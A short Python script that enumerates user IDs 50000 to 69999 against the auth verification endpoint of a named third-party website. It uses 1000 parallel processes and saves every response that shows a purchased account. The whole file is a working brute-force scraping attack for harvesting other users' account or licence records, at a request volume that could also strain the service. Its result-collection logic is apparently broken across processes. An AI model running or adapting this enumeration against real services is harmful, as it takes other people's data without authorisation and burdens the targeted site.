import requests
from multiprocessing import Pool

urlList = []
arr = []
j = 0
g = 1
for i in range(50000, 70000):
    urlList.append('http://cp-tools.cn/auth/verify?uid=%s' % str(i))


def muke(i):
    r = requests.get(i)
    if r.json()['msg'] != '未购买':
        print(r.json())
        arr.append(r.json())


if __name__ == '__main__':
    pool = Pool(processes=1000)
    pool.map_async(muke, urlList)
    pool.close()
    pool.join()
    with open('./text/muke1', 'w+') as f:
        f.write(str(arr))
